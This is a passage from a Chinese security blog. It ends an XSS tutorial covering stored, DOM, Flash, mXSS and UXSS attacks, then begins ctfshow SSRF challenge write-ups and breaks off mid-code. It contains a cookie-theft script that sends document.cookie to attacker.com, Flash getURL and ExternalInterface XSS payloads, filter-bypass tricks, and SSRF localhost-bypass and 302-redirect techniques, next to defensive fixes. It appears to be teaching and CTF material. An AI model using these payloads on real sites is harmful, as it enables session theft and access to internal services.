show_comments.php):</strong></p><ul><li><code>comment.php</code>: 接收评论表单提交 (<code>POST</code>)，未充分验证&#x2F;转义就存入数据库。</li><li><code>show_comments.php</code>: 从数据库读取评论，未转义就直接输出到页面：<code>echo $comment[&#39;text&#39;];</code></li></ul></li><li><p><strong>攻击者提交的评论:</strong><br><code>&lt;script&gt;fetch(&#39;https://attacker.com/steal?cookie=&#39; + document.cookie);&lt;/script&gt;</code></p></li><li><p><strong>防御：</strong></p><ol><li><p><code>comment.php</code> 后端：可进行输入验证（限制长度、字符），但<strong>核心防御在输出时</strong>。</p></li><li><p><code>show_comments.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$comments</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$comment</span>) &#123;<br>    <span class="hljs-variable">$safeText</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$comment</span>[<span class="hljs-string">&#x27;text&#x27;</span>], ENT_QUOTES, <span class="hljs-string">&#x27;UTF-8&#x27;</span>); <span class="hljs-comment">// 输出编码</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;div class=&#x27;comment&#x27;&gt;<span class="hljs-subst">$safeText</span>&lt;/div&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>如果允许富文本评论，则需要在存储或输出前使用 HTML 净化器 (如 HTMLPurifier)。</p></li></ol></li></ul><h3 id="案例-3：基于-DOM-的-XSS-通过-location-hash"><a href="#案例-3：基于-DOM-的-XSS-通过-location-hash" class="headerlink" title="案例 3：基于 DOM 的 XSS (通过 location.hash)"></a>案例 3：基于 DOM 的 XSS (通过 location.hash)</h3><ul><li><p><strong>有漏洞的客户端代码 (vulnerable.js):</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">displayWelcome</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> username = location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>); <span class="hljs-comment">// 从 URL 片段获取用户名</span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;welcomeMessage&#x27;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&quot;Welcome, &quot;</span> + username + <span class="hljs-string">&quot;!&quot;</span>; <span class="hljs-comment">// 危险！使用 innerHTML</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><blockquote><p><strong>攻击者构造的 URL:</strong><br><code>http://victim-site.com/dashboard#&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;</code></p></blockquote></li><li><p><strong>防御 (修复后 vulnerable.js):</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">displayWelcome</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> username = location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">// 使用安全的 textContent 设置纯文本</span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;welcomeMessage&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">&quot;Welcome, &quot;</span> + username + <span class="hljs-string">&quot;!&quot;</span>;<br>&#125;<br><span class="hljs-comment">// 或者，如果必须显示 HTML（不推荐），使用 DOMPurify:</span><br><span class="hljs-comment">// import DOMPurify from &#x27;dompurify&#x27;; // 假设已引入库</span><br><span class="hljs-comment">// var safeUsername = DOMPurify.sanitize(username); // 净化</span><br><span class="hljs-comment">// document.getElementById(&#x27;welcomeMessage&#x27;).innerHTML = &quot;Welcome, &quot; + safeUsername + &quot;!&quot;;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><ul><li><strong>XSS 是注入攻击：</strong> 将恶意脚本注入到受信任的网页中。</li><li><strong>危害巨大：</strong> 可窃取会话、数据、冒充用户、传播恶意软件等。</li><li><strong>三大类型：</strong> 反射型（通过恶意 URL）、存储型（存储在服务器）、DOM 型（纯客户端）。</li><li><strong>根本原因：</strong> 将<strong>不可信的用户输入</strong>未经<strong>正确的上下文感知输出编码</strong>或<strong>安全净化</strong>就直接嵌入到 HTML&#x2F;JS 上下文中。</li><li><strong>核心防御：</strong><ul><li><strong>对所有输出进行上下文感知的转义&#x2F;编码！</strong> (最重要)</li><li><strong>输入验证</strong>（作为补充）。</li><li><strong>使用安全的 DOM API</strong>（避免 <code>innerHTML</code>&#x2F;<code>eval</code> 等）。</li><li><strong>设置 Cookie <code>HttpOnly</code> 和 <code>Secure</code>。</strong></li><li><strong>实施严格的内容安全策略 (CSP)</strong>（尤其禁止内联脚本和 <code>eval</code>）。</li><li><strong>在允许 HTML 时使用成熟的净化库。</strong></li></ul></li><li><strong>持续警惕：</strong> XSS 是 Web 安全中最常见也最危险的漏洞之一。防御需要开发者在整个应用生命周期（设计、编码、测试、部署）中始终保持安全意识，并采用纵深防御策略。</li></ul><p>理解 XSS 的原理和防御方法对于构建安全的 Web 应用至关重要。永远记住：<strong>不要信任用户输入！</strong> 输出前必须进行适当的编码或净化。</p><h1 id="简洁知识"><a href="#简洁知识" class="headerlink" title="简洁知识"></a>简洁知识</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><blockquote><p>如<a href="http://example.com/xss.php?x=">http://example.com/xss.php?x=</a><iframe src="http://exam.com">test</iframe>iframe&gt;，利用js打开其他网站。一般用在搜索栏。</p></blockquote><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>登录，留言界面会把输入的信息存到数据库或者管理员面板，可以进行xss，使管理员等界面弹窗</p><h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>换方法，闭合标签，双写大小写，编码</p><h1 id="dom型xss的特殊之处"><a href="#dom型xss的特殊之处" class="headerlink" title="dom型xss的特殊之处"></a>dom型xss的特殊之处</h1><p>DOM型XSS更隐蔽，因为它是在客户端“作案”，传统的服务器防火墙可能根本看不到“犯罪过程”。</p><h3 id="普通XSS-反射型-存储型-——-“后厨加料”"><a href="#普通XSS-反射型-存储型-——-“后厨加料”" class="headerlink" title="普通XSS (反射型&#x2F;存储型) —— “后厨加料”"></a>普通XSS (反射型&#x2F;存储型) —— “后厨加料”</h3><p>在这种模式下，问题出在<strong>后厨（服务器）</strong>。</p><p>1.<br>2. <strong>你点菜（发送请求）</strong>：你告诉服务员（浏览器），“我要一盘宫保鸡丁，多加点‘花生’（恶意脚本）”。<br>3. <strong>后厨做菜（服务器处理）</strong>：服务员把你的要求传到后厨。后厨的厨师（服务器代码）很粗心，他看到你的特殊要求“加花生”，想都没想，<strong>直接就把“花生”做进了菜里</strong>。<br>4. <strong>上菜（服务器返回HTML）</strong>：服务员把这盘**已经被加了料的宫保鸡丁（含有恶意脚本的HTML页面）**端到你的桌上。<br>5. <strong>你中招（浏览器执行脚本）</strong>：你一看，这就是你点的菜，直接就吃了。结果，你对花生过敏，中招了。</p><p><strong>关键点：</strong></p><p>- </p><ul><li><blockquote><p><strong>菜离开后厨时已经有毒了</strong>。你用筷子（浏览器开发者工具）翻开这盘菜（查看网页源代码），能直接看到那颗“花生”（<script>alert(&#39;XSS&#39;)</script>）。</p></blockquote></li><li><p><strong>责任方是后厨（服务器）</strong>，因为它没有检查你的特殊要求是不是安全的。</p></li></ul><h3 id="DOM型XSS-——-“餐桌上自己加料”"><a href="#DOM型XSS-——-“餐桌上自己加料”" class="headerlink" title="DOM型XSS —— “餐桌上自己加料”"></a>DOM型XSS —— “餐桌上自己加料”</h3><p>在这种模式下，问题出在<strong>你的餐桌上（浏览器）</strong>。</p><p>1.<br>2. <strong>你点菜（发送请求）</strong>：你告诉服务员（浏览器），“我要一盘宫保鸡丁”。同时你悄悄地在自己的点菜单角落（URL的#部分）写下了“加花生”的备注。<br>3. <strong>后厨做菜（服务器处理）</strong>：服务员把你的点菜单（URL）递给后厨。后厨的厨师（服务器代码）非常专业，他<strong>只看菜名“宫保鸡丁”，根本不看也看不到你写的角落备注</strong>。<br>4. <strong>上菜（服务器返回HTML）</strong>：后厨做了一盘<strong>100%安全、美味、不含花生的宫保鸡丁（干净的HTML页面）</strong>，服务员把它端到了你的桌上。</p><ol start="5"><li><h2 id="你中招（浏览器执行脚本）：现在，菜是安全的。但是，你的桌上放着一瓶“万能调料”（页面自带的JavaScript代码）。这瓶调料的说明书（JS代码）上写着一条不安全的指令：“请阅读你点菜单角落的备注（读取URL的-部分），并把它加到菜里。”"><a href="#你中招（浏览器执行脚本）：现在，菜是安全的。但是，你的桌上放着一瓶“万能调料”（页面自带的JavaScript代码）。这瓶调料的说明书（JS代码）上写着一条不安全的指令：“请阅读你点菜单角落的备注（读取URL的-部分），并把它加到菜里。”" class="headerlink" title="你中招（浏览器执行脚本）：现在，菜是安全的。但是，你的桌上放着一瓶“万能调料”（页面自带的JavaScript代码）。这瓶调料的说明书（JS代码）上写着一条不安全的指令：“请阅读你点菜单角落的备注（读取URL的#部分），并把它加到菜里。”"></a><strong>你中招（浏览器执行脚本）</strong>：现在，菜是安全的。但是，你的桌上放着一瓶“万能调料”（页面自带的JavaScript代码）。这瓶调料的说明书（JS代码）上写着一条不安全的指令：“请阅读你点菜单角落的备注（读取URL的#部分），并把它加到菜里。”</h2><ul><li>于是，你（浏览器）自己拿起“花生”（恶意脚本），亲手把它洒在了本来安全的宫保鸡丁上，然后吃了下去。结果中招了。</li></ul></li></ol><p><strong>关键点：</strong></p><p>- </p><ul><li><blockquote><p><strong>菜离开后厨时是绝对安全的</strong>。你用筷子翻开这盘刚端上来的菜（查看网页源代码），里面根本没有“花生”（<script>标签）。</p></blockquote></li><li><p>是桌上的那瓶**“万能调料”的说明书（客户端JavaScript代码）有缺陷**，它让你自己把危险的东西加了进去。</p></li><li><p><strong>责任方是你自己（浏览器/客户端JavaScript）</strong>。后厨（服务器）是无辜的。</p></li></ul><h3 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h3><table><thead><tr><th>特性</th><th>普通XSS (反射型/存储型)</th><th>DOM型XSS</th></tr></thead><tbody><tr><td><strong>漏洞位置</strong></td><td><strong>服务器端</strong></td><td><strong>客户端（浏览器端）</strong></td></tr><tr><td><strong>处理方</strong></td><td>服务器将恶意代码插入HTML后返回</td><td>客户端JavaScript不安全地处理数据并修改DOM</td></tr><tr><td><strong>服务器参与度</strong></td><td><strong>核心参与者</strong>，负责处理和返回恶意代码</td><td><strong>可能完全不参与</strong>，只负责提供包含脆弱JS的页面</td></tr><tr><td><strong>常见Payload位置</strong></td><td>URL参数、POST表单数据</td><td>URL片段（#号后）、document.URL等客户端可访问的数据源</td></tr><tr><td><strong>防御重点</strong></td><td><strong>服务器端</strong>的输入验证和输出编码</td><td><strong>客户端</strong>的输入验证和安全DOM操作（如使用textContent代替innerHTML）</td></tr></tbody></table><p>简单来说，区分它们最关键的一点就是：<strong>看恶意脚本是在服务器端被插入到HTML中的，还是在客户端被JavaScript插入到DOM中的。</strong></p><h1 id="Flash-XSS攻击"><a href="#Flash-XSS攻击" class="headerlink" title="Flash XSS攻击"></a>Flash XSS攻击</h1><p>核心是让浏览器加载恶意的 SWF。可以直接上传恶意 SWF 文件(如头像、附件)，也可以利用网站上已有的“功能性”SWF 文件(如广告位、图表)</p><h2 id="测试swf文件的xss安全性"><a href="#测试swf文件的xss安全性" class="headerlink" title="测试swf文件的xss安全性"></a>测试swf文件的xss安全性</h2><ol><li>反编译swf文件</li><li>查找触发危险函数</li><li>找可控参数访问触发</li></ol><p>工具：JPEXS FREE FLASH DECOMPILER</p><blockquote><p>如<a href="http://example.com/uploader.swf?jsobject=alert(1)">http://example.com/uploader.swf?jsobject=alert(1)</a></p></blockquote><p>xss是指执行恶意js，flash有可以调用的js函数，如果这些函数使用不当就会造成xss。</p><ol><li><blockquote><p><strong>绕过过滤器：</strong> 许多网站的 XSS 防御机制只针对 HTML 标签（如 <script>, <img>, <a>），而对加载的 Flash 文件及其参数疏于防范。</p></blockquote></li><li><p><strong>更强的能力：</strong> Flash 本身可以发起网络请求，这使得攻击者不仅可以在客户端执行脚本，还能利用用户的浏览器作为代理，向内网或其他服务器发起请求。</p></li><li><p><strong>隐蔽性：</strong> 攻击载荷（payload）存在于二进制的 SWF 文件中，难以被传统的Web应用防火墙（WAF）或安全审计工具检测到。</p></li></ol><h2 id="利用的关键在于-Flash-的两个核心函数"><a href="#利用的关键在于-Flash-的两个核心函数" class="headerlink" title="利用的关键在于 Flash 的两个核心函数"></a>利用的关键在于 Flash 的两个核心函数</h2><h3 id="A-getURL-函数"><a href="#A-getURL-函数" class="headerlink" title="A. getURL() 函数"></a><strong>A. <code>getURL()</code> 函数</strong></h3><p>在 Flash 的 ActionScript 2 中，<code>getURL()</code> 函数可以用来跳转页面或执行 JavaScript。</p><ul><li><p><strong>攻击代码 (ActionScript):</strong></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-comment">// 从 URL 参数 &#x27;callback&#x27; 中获取要执行的 JS 代码</span><br><span class="hljs-keyword">var</span> js_code = _root.callback;<br>getURL(<span class="hljs-string">&quot;javascript:&quot;</span> + js_code);<br></code></pre></td></tr></table></figure></li><li><p><strong>攻击场景:</strong><br>假设一个网站用 <code>player.swf</code> 来播放视频，并通过 URL 参数指定视频地址。攻击者发现这个 <code>player.swf</code> 中有一个未被安全处理的 <code>getURL</code> 调用。他可以构造如下 URL：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//example.com/player.swf?callback=alert(document.cookie)</span><br></code></pre></td></tr></table></figure><blockquote><p>当用户访问这个 URL 时，<code>player.swf</code> 会执行 <code>getURL(&quot;javascript:alert(document.cookie)&quot;)</code>，从而触发 XSS。</p></blockquote></li></ul><h3 id="B-ExternalInterface-call-函数"><a href="#B-ExternalInterface-call-函数" class="headerlink" title="B. ExternalInterface.call() 函数"></a><strong>B. <code>ExternalInterface.call()</code> 函数</strong></h3><p>在 ActionScript 3 中，这是与浏览器 JavaScript 交互的主要桥梁。它允许 Flash 直接调用页面中的 JavaScript 函数。</p><ul><li><p><strong>攻击代码 (ActionScript):</strong></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-comment">// 从 Flash 的参数（flashvars）中获取要调用的函数名和参数</span><br><span class="hljs-keyword">var</span> func_name = ExternalInterface.call(<span class="hljs-string">&quot;eval&quot;</span>, flashvars.func);<br><span class="hljs-keyword">var</span> func_param = ExternalInterface.call(<span class="hljs-string">&quot;eval&quot;</span>, flashvars.param);<br><span class="hljs-comment">// 直接调用页面的 JS 函数</span><br>ExternalInterface.call(func_name, func_param);<br></code></pre></td></tr></table></figure></li><li><p><strong>攻击场景:</strong><br>攻击者发现一个 <code>chart.swf</code> 文件可以接收参数并调用页面的 JS 函数来更新数据。他可以构造如下 URL 或 HTML：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://example.com/chart.swf&quot;</span> <span class="hljs-attr">flashvars</span>=<span class="hljs-string">&quot;func=alert&amp;param=document.domain&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>当这个 SWF 被加载时，它会执行 <code>ExternalInterface.call(&quot;alert&quot;, document.domain)</code>，从而触发 XSS。</p></blockquote></li></ul><hr><h2 id="关键的防御机制"><a href="#关键的防御机制" class="headerlink" title="关键的防御机制"></a>关键的防御机制</h2><p>防御 Flash XSS 的核心在于正确配置 Flash 的安全参数和策略。</p><h4 id="1-allowScriptAccess-参数"><a href="#1-allowScriptAccess-参数" class="headerlink" title="1. allowScriptAccess 参数"></a>1. <code>allowScriptAccess</code> 参数</h4><p>这是防御 Flash XSS <strong>最重要、最核心</strong>的参数。它在 HTML 的 <code>&lt;object&gt;</code> 或 <code>&lt;embed&gt;</code> 标签中设置，用来控制 SWF 文件与宿主 HTML 页面的脚本交互权限。</p><p>它有三个值：</p><ul><li><strong><code>always</code> (总是允许):</strong>  <strong>极度危险！</strong> 无论 SWF 文件来自哪个域，都允许它与页面进行脚本交互。这是导致 Flash XSS 的最主要原因。</li><li><strong><code>sameDomain</code> (同域允许):</strong> <strong>推荐的安全设置。</strong> 只允许与 HTML 页面来自<strong>同一个域</strong>的 SWF 文件进行脚本交互。这样，即使攻击者能让网站加载一个来自他自己服务器的恶意 SWF，这个 SWF 也没有权限执行 JavaScript。</li><li><strong><code>never</code> (从不允许):</strong> <strong>最安全。</strong> 完全禁止 SWF 文件与页面进行任何脚本交互。如果 Flash 的功能不需要调用 JS，这是最安全的选择。</li></ul><p><strong>防御示例:</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 安全的配置 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">...</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;movie&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;player.swf&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;allowScriptAccess&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;sameDomain&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="2-crossdomain-xml-策略文件"><a href="#2-crossdomain-xml-策略文件" class="headerlink" title="2. crossdomain.xml 策略文件"></a>2. <code>crossdomain.xml</code> 策略文件</h4><p>这个文件放在网站的根目录下，用于控制<strong>不同域</strong>的 SWF 文件是否可以加载本域的数据。虽然它主要用于控制数据加载权限，但一个过于宽松的 <code>crossdomain.xml</code> 文件也可能成为攻击链的一部分。</p><ul><li><p><strong>危险的配置 (允许任何域加载数据):</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">cross-domain-policy</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">allow-access-from</span> <span class="hljs-attr">domain</span>=<span class="hljs-string">&quot;*&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">cross-domain-policy</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="3-输入验证"><a href="#3-输入验证" class="headerlink" title="3. 输入验证"></a>3. 输入验证</h4><p>和所有 XSS 一样，对用户输入进行严格的验证是必不可少的。特别是对于那些作为 SWF 文件 URL 或传递给 SWF 的参数，必须进行严格的过滤，防止用户注入恶意内容。</p><h1 id="其他类型XSS"><a href="#其他类型XSS" class="headerlink" title="其他类型XSS"></a>其他类型XSS</h1><h2 id="MXSS"><a href="#MXSS" class="headerlink" title="MXSS"></a>MXSS</h2><p>突变型XSS，指的是原先的Payload提交是无害不会产生XSS，而由于一些特殊原因，如反编码等，导致Payload发生变异，导致的XSS。主要存在于以前版本的PC端的QQ客户端的页面预览功能。</p><h2 id="UXSS"><a href="#UXSS" class="headerlink" title="UXSS"></a>UXSS</h2><p>通用型XSS，利用浏览器或者扩展漏洞来制造产生XSS并执行代码的一种攻击类型。如Edge浏览器(指定版本)翻译功能导致JS语句被调用执行。</p><blockquote><img src=x onerror=alert(1)></blockquote><p>SVG,PDF,</p><p>制作带有JS代码的执行文件，利用上传，取得文件路径，去触发JS代码</p><p>SWF</p><p>1.制作带有JS代码的执行文件，利用上传，取得文件路径，去触发JS代码</p><p>2.对本身存在的swf反编译逆向，分析触发点，触发JS</p>]]></content>
    
    
    <categories>
      
      <category>web漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF-SSRF</title>
    <link href="/2025/05/08/CTF-SSRF/"/>
    <url>/2025/05/08/CTF-SSRF/</url>
    
    <content type="html"><![CDATA[<h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 关闭所有错误报告，不显示任何PHP错误、警告或通知</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 高亮显示当前文件源代码（用于调试或展示代码）</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">// 从POST请求中获取名为&#x27;url&#x27;的参数值</span><br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><br><span class="hljs-comment">// 初始化一个cURL会话，指定要访问的URL</span><br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><br><span class="hljs-comment">// 设置cURL选项：不包含HTTP头部信息在输出中</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 设置cURL选项：将获取的内容作为字符串返回，而不是直接输出</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">// 执行cURL请求，获取目标URL的内容</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><br><span class="hljs-comment">// 关闭cURL会话，释放资源</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br><span class="hljs-comment">// 输出获取到的内容</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>url传127.0.0.1发现有回显，试试看访问其目录</p><p><img src="/../images/ef83ffd8-6690-4138-b0ea-c3e89fb72edb.png" alt="ef83ffd8-6690-4138-b0ea-c3e89fb72edb"></p><h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><h4 id="localhost-127-0-0-1被过滤"><a href="#localhost-127-0-0-1被过滤" class="headerlink" title="localhost,127.0.0.1被过滤"></a>localhost,127.0.0.1被过滤</h4><p>IP地址在解析时，如果省略了某些部分，系统会自动用 <code>0</code> 来填充。可以用0或0.0.0.0或127.1（会解析成127.0.0.1）或127.0.1</p><h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br></code></pre></td></tr></table></figure><h4 id="通过ip地址解析为127-0-0-1的网站进行绕过"><a href="#通过ip地址解析为127-0-0-1的网站进行绕过" class="headerlink" title="通过ip地址解析为127.0.0.1的网站进行绕过"></a>通过ip地址解析为127.0.0.1的网站进行绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">spoofed.burpcollaborator.net<br><br>safe.taobao.com<br><br>sudo.cc<br></code></pre></td></tr></table></figure><h3 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">3</span>))&#123; <br></code></pre></td></tr></table></figure><h4 id="要求ip长度小于3"><a href="#要求ip长度小于3" class="headerlink" title="要求ip长度小于3"></a>要求ip长度小于3</h4><p>用<a href="http://0即可/">http://0即可</a></p><h3 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h3><h4 id="利用个人vps实现302跳转"><a href="#利用个人vps实现302跳转" class="headerlink" title="利用个人vps实现302跳转"></a>利用个人vps实现302跳转</h4><p>攻击者诱使<strong>服务器端</strong>应用向攻击者指定的内部或外部地址发起HTTP请求。关键在于，这个请求是从<strong>目标服务器</strong>发出的，而不是从攻击者的浏览器发出的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><strong><code>header()</code> 函数</strong>： 这是PHP中用于发送原始HTTP头部的函数。</li><li><strong><code>Location:</code> 头部</strong>： 这是一个特殊的HTTP响应头。当浏览器或任何HTTP客户端收到一个包含 <code>Location</code> 头的响应时，它会<strong>自动</strong>向该头指定的新URL发起一个新的GET请求。这就是所谓的“HTTP重定向”。</li><li><strong>状态码 302</strong>： 虽然代码中没有明确写，但 <code>header(&quot;Location: ...&quot;)</code> 默认会发送 <strong>302 Found</strong> 状态码（除非之前用 <code>header(&quot;HTTP/1.1 301 Moved Permanently&quot;)</code> 指定了其他状态码）。302表示“临时重定向”。</li></ul><p>访问url&#x3D;<a href="http://ip/ssrf.php%E5%8D%B3%E5%8F%AF%E3%80%82">http://ip/ssrf.php即可。</a></p><h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>); <br></code></pre></td></tr></table></figure><h4 id="需要以ctf开头，show结尾"><a href="#需要以ctf开头，show结尾" class="headerlink" title="需要以ctf开头，show结尾"></a>需要以ctf开头，show结尾</h4><p>一个完整的URL遵循以下语法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]<br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">http://admin:pass123@example.com/dashboard<br></code></pre></td></tr></table></figure><p>这表示使用用户名 <code>admin</code> 和密码 <code>pass123</code> 访问 <code>example.com</code> 的 <code>/dashboard</code>。</p><p>可用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 